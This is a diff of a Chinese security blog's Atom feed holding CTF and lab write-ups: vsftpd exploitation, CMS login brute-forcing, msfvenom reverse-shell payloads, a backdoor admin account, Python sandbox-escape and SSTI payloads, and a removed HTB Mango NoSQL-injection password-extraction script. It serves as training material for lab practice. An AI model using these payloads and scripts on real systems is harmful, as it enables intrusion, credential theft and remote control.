@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://prontosil.com/"/>
-  <updated>2020-03-10T09:52:23.711Z</updated>
+  <updated>2020-03-10T09:52:51.342Z</updated>
   <id>http://prontosil.com/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://prontosil.com/posts/12fff649/"/>
     <id>http://prontosil.com/posts/12fff649/</id>
     <published>2020-03-10T08:57:06.000Z</published>
-    <updated>2020-03-10T09:52:23.711Z</updated>
+    <updated>2020-03-10T09:52:51.342Z</updated>
     
     <content type="html"><![CDATA[<p>实验拓扑如下</p><p><img src="/posts/12fff649/1583830717716.png" alt></p><p><img src="/posts/12fff649/1583830733667.png" alt></p><h2 id="任务一-寻找漏洞主机"><a href="#任务一-寻找漏洞主机" class="headerlink" title="任务一 寻找漏洞主机"></a>任务一 寻找漏洞主机</h2><p>扫描存活主机(虽然知道了但还是扫一下)</p><p>注意本机ip是192.168.1.2</p><p><img src="/posts/12fff649/1583830890209.png" alt></p><p>-F 选项快速扫描一下其他主机</p><p><img src="/posts/12fff649/1583830929741.png" alt></p><p><img src="/posts/12fff649/1583830945755.png" alt></p><p>既然是ftp，那么就锁定192.168.1.3</p><p>提示了搜索vsftpd (靶机上搜索太慢了，我在自己机器上搜索的)</p><p><img src="/posts/12fff649/1583831162349.png" alt></p><p>然后使用这个exploit去打就行了</p><p><img src="/posts/12fff649/1583831194224.png" alt></p><p>可以看到进去就是root权限hhhh</p><p>然后还要搜索 1.key 这个文件</p><pre><code>find  / -name 1.key</code></pre><p><img src="/posts/12fff649/1583831225885.png" alt></p><p>读一下就好了</p><h2 id="任务二-使用nikto、crunch和burpsuite进行网站渗透和控制"><a href="#任务二-使用nikto、crunch和burpsuite进行网站渗透和控制" class="headerlink" title="任务二 使用nikto、crunch和burpsuite进行网站渗透和控制"></a>任务二 使用nikto、crunch和burpsuite进行网站渗透和控制</h2><p>此时的目标转向了 192.168.1.4 (192.168.1.3都拿到root了)</p><p>打开网站是 Cms made Simple 简称cms cms</p><p><img src="/posts/12fff649/1583831499729.png" alt></p><p>后台地址 <code>/admin/login.php</code></p><p>先设置一个代理</p><p><img src="/posts/12fff649/1583832214527.png" alt></p><p>然后抓个包</p><p><img src="/posts/12fff649/1583832242295.png" alt></p><p>由于密码是 <code>admin</code> 加上三位数字，如果想用 crunch 生成也行，直接用burp也行</p><p>爆破成功</p><p><img src="/posts/12fff649/1583832729565.png" alt></p><p>进入到网站后台</p><p><img src="/posts/12fff649/1583832774511.png" alt></p><h2 id="任务三-获取webshell权限并拿到目标及开放的远程桌面端口号"><a href="#任务三-获取webshell权限并拿到目标及开放的远程桌面端口号" class="headerlink" title="任务三 获取webshell权限并拿到目标及开放的远程桌面端口号"></a>任务三 获取webshell权限并拿到目标及开放的远程桌面端口号</h2><p>漏洞点在这</p><p><img src="/posts/12fff649/1583833127686.png" alt></p><p>Run一下</p><p><img src="/posts/12fff649/1583833240668.png" alt></p><p>好那我们这里为了避免网页卡顿。用msf生成一个shell.php</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f raw -o shell.txt</code></pre><p>然后复制到框框里运行一下</p><p>同时msf进行监听</p><p><img src="/posts/12fff649/1583833748737.png" alt></p><p>成功弹到shell。之后再使用msf生成shell.exe</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe -o shell.exe</code></pre><p>上传，重新弹一个shell</p><p><img src="/posts/12fff649/1583833790609.png" alt></p><p>ok这时候就能获得真正的meterpreter了</p><p>查看一下监听端口</p><p><img src="/posts/12fff649/1583833821793.png" alt></p><p>随便猜一个吧2333</p><h2 id="任务四-向目标主机添加用户并控制"><a href="#任务四-向目标主机添加用户并控制" class="headerlink" title="任务四 向目标主机添加用户并控制"></a>任务四 向目标主机添加用户并控制</h2><p>这个步骤和上一个实验比较相似，就不用细说了</p><pre><code>net user hacker Beijing123 /addnet localgroup administrators hacker /add</code></pre><p>远程登陆之后，给文件添加一个用户即可</p><p>最后</p><p><img src="/posts/12fff649/1583833940934.png" alt></p>]]></content>
     
@@ -68,6 +68,33 @@
     
     
       <category term="实验" scheme="http://prontosil.com/tags/%E5%AE%9E%E9%AA%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python沙盒逃逸</title>
+    <link href="http://prontosil.com/posts/ed9dc04e/"/>
+    <id>http://prontosil.com/posts/ed9dc04e/</id>
+    <published>2020-03-10T07:19:07.000Z</published>
+    <updated>2020-03-10T11:53:59.825Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h2><p>两个重要的类，一般都会用到</p><pre><code class="python">In [44]: object.__subclasses__()[59]Out[44]: warnings.catch_warningsIn [45]: object.__subclasses__()[40]Out[45]: file</code></pre><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code class="python">().__class__.__bases__[0].__subclasses__()[40](&#39;filename&#39;).readlines()().__class__.__mro__[1].__subclasses__()[40](&#39;filename&#39;).readlines()</code></pre><p>如图</p><p><img src="/posts/ed9dc04e/1582442823657.png" alt></p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].getlines(&#39;/etc/passwd&#39;)</code></pre><p><img src="/posts/ed9dc04e/1582444265686.png" alt></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code class="python">().__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]</code></pre><p><img src="/posts/ed9dc04e/1582443624642.png" alt></p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39;+&#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;popen&#39;](&#39;l&#39;+&#39;s&#39;).read()#也可以写成().__class__.__bases__[.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;os&#39;].popen(&#39;ls&#39;).read()# 等价于object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()</code></pre><p><img src="/posts/ed9dc04e/1582446827696.png" alt></p><p>可以使用 <code>__getattribute__</code> 获得属性， <code>__dict__</code></p><p>寻找可以利用的模块</p><pre><code class="python">search = &#39;os&#39;   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        keys = i.__init__.__globals__.keys()        if search in keys:            print(i, num)    except:        pass &#39;&#39;&#39;(&lt;class &#39;site._Printer&#39;&gt;, 71)(&lt;class &#39;site.Quitter&#39;&gt;, 76)(&lt;class &#39;socket._socketobject&#39;&gt;, 124)...&#39;&#39;&#39;</code></pre><p>比如</p><p><img src="/posts/ed9dc04e/1582443247342.png" alt></p><p>来自其他师傅的</p><pre><code class="python">object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()</code></pre><h2 id="py2和3通吃"><a href="#py2和3通吃" class="headerlink" title="py2和3通吃"></a>py2和3通吃</h2><pre><code class="python">search = &#39;__builtins__&#39;   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        keys = i.__init__.__globals__.keys()        if search in keys:            print(i, num)    except:        pass </code></pre><p>python2 举例</p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><p><img src="/posts/ed9dc04e/1582446435900.png" alt></p><p>python3</p><pre><code class="python">().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></pre><p><img src="/posts/ed9dc04e/1582443435704.png" alt></p><h2 id="python3-读文件"><a href="#python3-读文件" class="headerlink" title="python3 读文件"></a>python3 读文件</h2><pre><code class="python">In [64]: &quot;&quot;.__class__.__bases__[0].__subclasses__()[127]Out[64]: os._wrap_close&quot;&quot;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#39;popen&#39;](&#39;cat /etc/&#39;+&#39;passwd&#39;).read()</code></pre><p>i春秋比赛的一道题的payload</p><pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['po'+'pen']('cat this_is_the_fl'+'ag.txt').read()}}# waf 拦截了 popen 和 flag</code></pre><h2 id="flask-SSTI"><a href="#flask-SSTI" class="headerlink" title="flask SSTI"></a>flask SSTI</h2><p>常用的</p><pre><code class="python">{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}</code></pre><h3 id="request对象"><a href="#request对象" class="headerlink" title="request对象"></a>request对象</h3><p> 这个对象指的是当前请求对象，<code>request.environ</code>对象是一个与服务器环境相关的对象字典。值得一提的是，可以通过访问<code>request.args.get</code> <code>request.cookies</code> <code>request.headers</code>等访问我们的请求参数，这主要是用来绕过过滤。（比如不让输入某关键字，我们就可以通过cookies传入，然后从request.cookies获取即可）</p><h3 id="config对象"><a href="#config对象" class="headerlink" title="config对象"></a>config对象</h3><p> config对象是当前配置对象，是一个类字典的对象，可以用<code>config.items()</code>来访问。而且它还有一些独特1的方法，<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code> 。<code>from_pyfile</code>可以读取指定python文件编译并加载进来。</p><h2 id="tornado-SSTI"><a href="#tornado-SSTI" class="headerlink" title="tornado SSTI"></a>tornado SSTI</h2><p>护网杯2018的一道题</p><p><img src="/posts/ed9dc04e/1582507995702.png" alt></p><p>然后我们通过 <code>{{handler.settings}}</code>来获得 cookie_secret</p><p><img src="/posts/ed9dc04e/1582508041772.png" alt></p><p>最后得到 flag</p><pre><code>http://efc64735-8171-468a-b0eb-98510cefe54d.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=5af68d1f8101c8a5cea67790540f1a1e</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;python2&quot;&gt;&lt;a href=&quot;#python2&quot; class=&quot;headerlink&quot; title=&quot;python2&quot;&gt;&lt;/a&gt;python2&lt;/h2&gt;&lt;p&gt;两个重要的类，一般都会用到&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;In [44
+      
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
+    
+    
+      <category term="python" scheme="http://prontosil.com/tags/python/"/>
     
   </entry>
   
@@ -486,35 +513,6 @@
       <category term="靶机" scheme="http://prontosil.com/tags/%E9%9D%B6%E6%9C%BA/"/>
     
       <category term="vulnhub" scheme="http://prontosil.com/tags/vulnhub/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HTB mango靶机实战</title>
-    <link href="http://prontosil.com/posts/73230382/"/>
-    <id>http://prontosil.com/posts/73230382/</id>
-    <published>2020-02-29T09:04:17.000Z</published>
-    <updated>2020-02-29T09:16:50.197Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22端口，80端口，443端口</p><p><img src="/posts/73230382/1582967083509.png" alt></p><p>这里改一下host</p><pre><code>staging-order.mango.htb</code></pre><p>访问网站</p><p><img src="/posts/73230382/1582967236329.png" alt></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>有点坑，是mongodb，nosql注入</p><p><img src="/posts/73230382/1582967256341.png" alt></p><p>参考爆破脚本</p><pre><code class="python">#!/usr/bin/env python  import requests  import string  url = &quot;http://staging-order.mango.htb/index.php&quot;  headers = {&quot;Host&quot;: &quot;staging-order.mango.htb&quot;}  cookies = {&quot;PHPSESSID&quot;: &quot;9k6j39np56td4vq3q4lg4eh95j&quot;}  possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\&quot;+c for c in string.punctuation+string.whitespace ]  def get_password(username):      print(&quot;Extracting password of &quot; + username)      params = {&quot;username&quot;:username, &quot;password[$regex]&quot;:&quot;&quot;, &quot;login&quot;: &quot;login&quot;}      password = &quot;^&quot;      while True:          for c in possible_chars:              params[&quot;password[$regex]&quot;] = password + c + &quot;.*&quot;              pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)              if int(pr.status_code) == 302:                  password += c                  break          if c == possible_chars[-1]:              print (&quot;Found password &quot;+password[1:].replace(&quot;\\&quot;, &quot;&quot;)+&quot; for username &quot;+username)              return password[1:].replace(&quot;\\&quot;, &quot;&quot;)  def get_usernames():      usernames = []      params = {&quot;username[$regex]&quot;:&quot;&quot;, &quot;password[$regex]&quot;:&quot;.*&quot;, &quot;login&quot;: &quot;login&quot;}      for c in possible_chars:          username = &quot;^&quot; + c          params[&quot;username[$regex]&quot;] = username + &quot;.*&quot;          pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)          if int(pr.status_code) == 302:              print(&quot;Found username starting with &quot;+c)              while True:                  for c2 in possible_chars:                      params[&quot;username[$regex]&quot;] = username + c2 + &quot;.*&quot;                      if int(requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False).status_code) == 302:                          username += c2                          print(username)                          break                  if c2 == possible_chars[-1]:                      print(&quot;Found username: &quot; +username[1:])                      usernames.append(username[1:])                      break      return usernames  for u in get_usernames():      get_password(u)  </code></pre><p>爆出密码</p><p><img src="/posts/73230382/1582967279320.png" alt></p><pre><code>Found username: mangoExtracting password of adminFound password t9KcS3&gt;!0B#2 for username adminExtracting password of mangoFound password h3mXK8RhU~f{]f5H for username mango</code></pre><p>使用mango用户登陆</p><p><img src="/posts/73230382/1582967292499.png" alt></p><p>切换为admin</p><p><img src="/posts/73230382/1582967301413.png" alt></p><pre><code>userflag$ cat user.txt79bf31c6c6eb38a8567832f7f8b47e92</code></pre><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><code>sudo -l</code> 试一下</p><p><img src="/posts/73230382/1582967336806.png" alt></p><pre><code>find / -user root -perm -4000 2&gt;/dev/null</code></pre><p>寻找SUID</p><p><img src="/posts/73230382/1582967364061.png" alt></p><p>根据<a href="https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt</a></p><p><img src="/posts/73230382/1582967372531.png" alt></p><pre><code class="bash">Warning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);jjs&gt; var FileReader = Java.type(&quot;java.io.FIleReader&quot;);java.lang.RuntimeException: java.lang.ClassNotFoundException: java.io.FIleReaderjjs&gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;);jjs&gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));jjs&gt; while((line=br.readline())!=null){print(line);}&lt;shell&gt;:1 TypeError: br.readline is not a functionjjs&gt; while((line=br.readLine())!=null){print(line);}8a8ef79a7a2fbb01ea81688424e9ab15</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;22端口，80端口，443端口&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/posts/73230382/1582967083509
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="HTB" scheme="http://prontosil.com/tags/HTB/"/>
-    
-      <category term="靶机" scheme="http://prontosil.com/tags/%E9%9D%B6%E6%9C%BA/"/>
     
   </entry>
   
